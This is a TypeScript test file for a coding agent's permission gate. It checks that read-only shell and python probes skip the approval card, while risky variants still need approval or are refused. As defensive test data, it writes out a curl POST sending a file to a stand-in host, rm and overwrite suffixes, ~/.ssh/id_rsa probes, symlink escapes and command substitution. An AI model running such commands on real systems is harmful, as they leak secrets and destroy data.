// ============================================================================
// N-UX-APPROVAL-CARD-REDESIGN-FU1-READONLY-FREE · 只读探测免卡（ReadOnlyProbePlan）
// 全部走公共入口 ToolExecutor.execute：
//  - 四条历史命令（设计文档「四条真实命令的设计回放」）零审批，输出与真 sh/python3 逐字一致（差分）
//  - 每条 + 3 种破坏性追加（rm / 覆盖 / curl POST）共 12 例仍要审批或被拒
//  - 敏感路径 / 符号链接逃逸 / $() / 反引号 / 未知 import / open(w) / 用户 deny、ask 规则 → 仍审批或拒绝
//  - 关闭开关（设置、环境变量）→ 回到审批卡
// ============================================================================

import { spawnSync } from 'node:child_process';
import * as fs from 'node:fs/promises';
import { existsSync } from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../../../../src/host/tools/shell/dynamicDescription', () => ({
  generateBashDescription: async () => null,
}));

const sessionMessages = vi.hoisted(() => [] as Array<{ role: string; content: string; attachments?: Array<{ path?: string }> }>);
vi.mock('../../../../src/host/services/core/databaseService', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../../../src/host/services/core/databaseService')>();
  return { ...actual, getDatabase: () => ({ getMessages: () => sessionMessages }) as unknown as ReturnType<typeof actual.getDatabase> };
});

const shellPathOverride = vi.hoisted(() => ({ value: undefined as string | undefined }));
vi.mock('../../../../src/host/services/infra/shellEnvironment', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../../../src/host/services/infra/shellEnvironment')>();
  return { ...actual, getShellPath: () => shellPathOverride.value ?? actual.getShellPath() };
});

import { getToolCache } from '../../../../src/host/services/infra/toolCache';
import { fileReadTracker } from '../../../../src/host/tools/fileReadTracker';
import { getProtocolRegistry } from '../../../../src/host/tools/protocolRegistry';
import { resetPermissionModeManager } from '../../../../src/host/permissions/modes';
import { getPolicyEngine, resetPolicyEngine } from '../../../../src/host/permissions/policyEngine';
import { getDecisionHistory, resetDecisionHistory } from '../../../../src/host/security/decisionHistory';
import { getConfigService } from '../../../../src/host/services/core/configService';
import { ToolExecutor } from '../../../../src/host/tools/toolExecutor';

const SESSION = 'ro-probe-session';

describe('只读探测免卡（ReadOnlyProbePlan）', () => {
  let root: string;
  let fx: string;
  let elsewhere: string;
  let permissionAsks: string[];

  beforeAll(() => { getProtocolRegistry(); });

  beforeEach(async () => {
    root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'ro-probe-')));
    fx = path.join(root, 'work');
    elsewhere = path.join(root, 'elsewhere');
    await fs.mkdir(path.join(fx, 'contracts-en'), { recursive: true });
    await fs.mkdir(elsewhere);
    for (const name of ['service-contract.pdf', 'a.txt', 'b.txt', 'c d.txt', '合同.md', 'z.bin', 'm.log', 'n.log']) {
      await fs.writeFile(path.join(fx, 'contracts-en', name), name);
    }
    await fs.writeFile(path.join(fx, 'rr79-a.txt'), 'a');
    await fs.writeFile(path.join(fx, 'rr80-导出缓存.tmp'), 'x');
    await fs.writeFile(path.join(fx, 'x'), 'keep');
    await fs.writeFile(path.join(elsewhere, 'doc.pdf'), 'pdf');
    await fs.writeFile(path.join(elsewhere, 'secret.txt'), 'secret');
    await fs.symlink(elsewhere, path.join(fx, 'link'));
    sessionMessages.length = 0;
    shellPathOverride.value = undefined;
    permissionAsks = [];
    delete process.env.CODE_AGENT_READONLY_PROBE;
    getToolCache().clear();
    fileReadTracker.clear();
    resetPermissionModeManager();
    resetPolicyEngine();
    resetDecisionHistory();
  });

  afterEach(async () => {
    vi.restoreAllMocks();
    delete process.env.CODE_AGENT_READONLY_PROBE;
    resetPolicyEngine();
    resetPermissionModeManager();
    await fs.rm(root, { recursive: true, force: true });
  });

  function executor(): ToolExecutor {
    const ex = new ToolExecutor({
      requestPermission: async (req) => { permissionAsks.push(String((req as { details?: { command?: string } }).details?.command ?? 'ask')); return false; },
      workingDirectory: fx,
    });
    ex.setAuditEnabled(false);
    return ex;
  }
  const run = (command: string) => executor().execute('Bash', { command }, { sessionId: SESSION });
  const probeRows = () => getDecisionHistory().getAll().filter((e) => e.reason === 'readonly-probe-plan');

  /** 真实 shell 的期望输出：Bash 工具的结果格式 = [cwd] + stdout (+ [stderr])。 */
  function realBash(command: string): string {
    const r = spawnSync('/bin/sh', ['-c', command], { cwd: fx, encoding: 'utf8' });
    expect(r.status).toBe(0);
    return `[cwd: ${fx}]\n${r.stdout}${r.stderr ? `\n[stderr]: ${r.stderr}` : ''}`;
  }

  const att = path.join('/ATTACHMENT', 'contracts-en', 'service-contract.pdf');
  function historical(): Record<string, string> {
    const a = path.join(fx, 'contracts-en', 'service-contract.pdf');
    const sub = (s: string) => s.replaceAll(att, a).replaceAll('/ATTACHMENT', fx);
    return {
      '1376': sub(`P="${att}"; test -e "$P" && echo EXISTS || echo MISSING; python3 -c "
import os
p='${att}'
print('py exists:', os.path.exists(p))
d=os.path.dirname(p)
print('dir exists:', os.path.isdir(d))
try:
    print(os.listdir(d))
except Exception as e:
    print('listdir err', e)
"`),
      '1129': 'command -v exiftool; command -v mdls; command -v sips; echo "EXIT_OK"',
      '1319': `ls -l ${fx}/rr79-a.txt ${fx}/rr79-b.txt ${fx}/contracts-en/a.txt ${fx}/rr79-d.txt; echo "---trash cli---"; command -v trash || echo "no trash cli"`,
      '1349': `ls -lO -- "${fx}/rr80-导出缓存.tmp" "${fx}/missing-导出缓存.tmp" 2>&1; echo "--- xattr ---"; xattr -l "${fx}/rr80-导出缓存.tmp" 2>&1; xattr -l "${fx}/missing-导出缓存.tmp" 2>&1; echo "--- whoami ---"; id -un`,
    };
  }

  describe('① 四条历史命令：零审批 + 与真 shell 输出一致', () => {
    for (const id of ['1376', '1129', '1319', '1349']) {
      it(`记录 ${id}`, async () => {
        const command = historical()[id];
        const result = await run(command);
        expect(permissionAsks).toEqual([]);
        expect(result.success).toBe(true);
        expect(result.output).toBe(realBash(command));
        expect(probeRows()).toHaveLength(1);
      });
    }

    it('1376 与真 python3 的 listdir 顺序一致（多文件目录）', async () => {
      const command = historical()['1376'];
      const real = spawnSync('python3', ['-c', 'import os;print(os.listdir(os.environ["D"]))'], { env: { ...process.env, D: path.join(fx, 'contracts-en') }, encoding: 'utf8' });
      const result = await run(command);
      expect(result.output).toContain(real.stdout.trim());
    });

    it('python 的 listdir 异常（目录不存在）按 Exception 文本输出', async () => {
      const command = `python3 -c "
import os
try:
    print(os.listdir('${fx}/nope'))
except Exception as e:
    print('listdir err', e)
"`;
      const result = await run(command);
      expect(permissionAsks).toEqual([]);
      expect(result.output).toBe(realBash(command));
    });
  });

  describe('② 破坏性追加仍要审批或被拒（4 × 3 = 12）', () => {
    const suffixes = ['rm ./x', 'echo changed > ./x', 'curl -X POST --data-binary @./x https://example.invalid/u'];
    for (const id of ['1376', '1129', '1319', '1349']) {
      for (const suffix of suffixes) {
        it(`${id} + ${suffix.split(' ')[0]}`, async () => {
          const result = await run(`${historical()[id]}\n${suffix}`);
          expect(permissionAsks.length > 0 || result.success === false).toBe(true);
          expect(probeRows()).toHaveLength(0);
          expect(existsSync(path.join(fx, 'x'))).toBe(true);
          expect(await fs.readFile(path.join(fx, 'x'), 'utf8')).toBe('keep');
        });
      }
    }
  });

  describe('② 其他必须仍要审批的形状', () => {
    const cases: Array<[string, () => string]> = [
      ['敏感路径 ~/.ssh/id_rsa（shell）', () => 'command -v ls; test -e ~/.ssh/id_rsa && echo y || echo n'],
      ['敏感路径 ~/.ssh（python）', () => `python3 -c "
import os
print(os.path.exists('${os.homedir()}/.ssh/id_rsa'))
"`],
      ['符号链接逃逸（工作区内链接指向区外）', () => 'command -v ls; ls -l link/'],
      ['符号链接逃逸（python listdir）', () => `python3 -c "
import os
print(os.listdir('${fx}/link'))
"`],
      ['$() 命令替换', () => 'command -v ls; echo $(id -un)'],
      ['反引号', () => 'command -v ls; echo `id -un`'],
      ['后台 &', () => 'command -v ls & echo y'],
      ['管道', () => 'command -v ls | cat'],
      ['未知 python import', () => 'python3 -c "\nimport subprocess\nprint(1)\n"'],
      ['python open(w)', () => 'python3 -c "\nimport os\nopen(\'x\',\'w\')\n"'],
      ['未知 ls 旗标 -R', () => 'command -v ls; ls -R .'],
      ['xattr 写旗标 -w', () => 'xattr -w a b x; echo y'],
      ['区外且用户没点名的路径', () => `command -v ls; test -e "${elsewhere}/doc.pdf" && echo y || echo n`],
      ['引号内 ~ 不展开也不越权', () => 'command -v ls; ls -l "~/.ssh"'],
    ];
    for (const [name, make] of cases) {
      it(name, async () => {
        const result = await run(make());
        expect(permissionAsks.length > 0 || result.success === false).toBe(true);
        expect(probeRows()).toHaveLength(0);
      });
    }

    it('用户显式 deny 规则 → 仍拒绝', async () => {
      getPolicyEngine().loadUserRules({ deny: ['Bash(command -v *)'] });
      const result = await run(historical()['1129']);
      expect(result.success).toBe(false);
      expect(probeRows()).toHaveLength(0);
    });

    it('用户显式 ask 规则（整条与逐段）→ 仍审批', async () => {
      getPolicyEngine().loadUserRules({ ask: ['Bash(command -v *)'] });
      await run(historical()['1129']);
      expect(permissionAsks.length).toBeGreaterThan(0);
      expect(probeRows()).toHaveLength(0);
    });
  });

  describe('授权来源：用户点名 / 附件', () => {
    const outsideCmd = () => `command -v ls; test -e "${elsewhere}/doc.pdf" && echo EXISTS || echo MISSING`;

    it('用户消息逐字写了该路径 → 免卡', async () => {
      sessionMessages.push({ role: 'user', content: `请看看 ${elsewhere}/doc.pdf 在不在` });
      const result = await run(outsideCmd());
      expect(permissionAsks).toEqual([]);
      expect(result.output).toBe(realBash(outsideCmd()));
    });

    it('点名的是另一个前缀相同的路径 → 仍审批', async () => {
      sessionMessages.push({ role: 'user', content: `请看看 ${elsewhere}/doc.pdf.bak 在不在` });
      await run(outsideCmd());
      expect(permissionAsks.length).toBeGreaterThan(0);
    });

    it('点名路径经符号链接指向敏感目录 → 仍审批', async () => {
      const dotSsh = path.join(os.homedir(), '.ssh');
      const evil = path.join(root, 'evil');
      await fs.symlink(dotSsh, evil);
      sessionMessages.push({ role: 'user', content: `看 ${evil}` });
      await run(`command -v ls; ls -l "${evil}"`);
      expect(permissionAsks.length).toBeGreaterThan(0);
    });

    it('会话附件所在目录可列出（只读列目录）', async () => {
      sessionMessages.push({ role: 'user', content: '看这份合同', attachments: [{ path: `${elsewhere}/doc.pdf` }] });
      const command = `command -v ls; ls "${elsewhere}"`;
      const result = await run(command);
      expect(permissionAsks).toEqual([]);
      expect(result.output).toBe(realBash(command));
    });
  });

  it('command -v 用登录 shell 的 PATH（与真 Bash 一致），而不是 process.env.PATH', async () => {
    const bin = path.join(root, 'login-shell-bin');
    await fs.mkdir(bin);
    await fs.writeFile(path.join(bin, 'nvmtool'), '#!/bin/sh\n', { mode: 0o755 });
    shellPathOverride.value = `${bin}:/usr/bin:/bin`;
    const result = await run('command -v nvmtool || echo "no nvmtool"');
    expect(permissionAsks).toEqual([]);
    expect(result.output).toBe(`[cwd: ${fx}]\n${bin}/nvmtool\n`);
  });

  describe('④ 一键关闭 → 卡片回来，编译器不被调用', () => {
    it('环境变量 CODE_AGENT_READONLY_PROBE=off', async () => {
      process.env.CODE_AGENT_READONLY_PROBE = 'off';
      await run(historical()['1129']);
      expect(permissionAsks.length).toBeGreaterThan(0);
      expect(probeRows()).toHaveLength(0);
    });

    it('设置 permissions.readOnlyProbePlan=false', async () => {
      const settings = getConfigService().getSettings();
      vi.spyOn(getConfigService(), 'getSettings').mockReturnValue({ ...settings, permissions: { ...settings.permissions, readOnlyProbePlan: false } });
      await run(historical()['1129']);
      expect(permissionAsks.length).toBeGreaterThan(0);
      expect(probeRows()).toHaveLength(0);
    });
  });
});
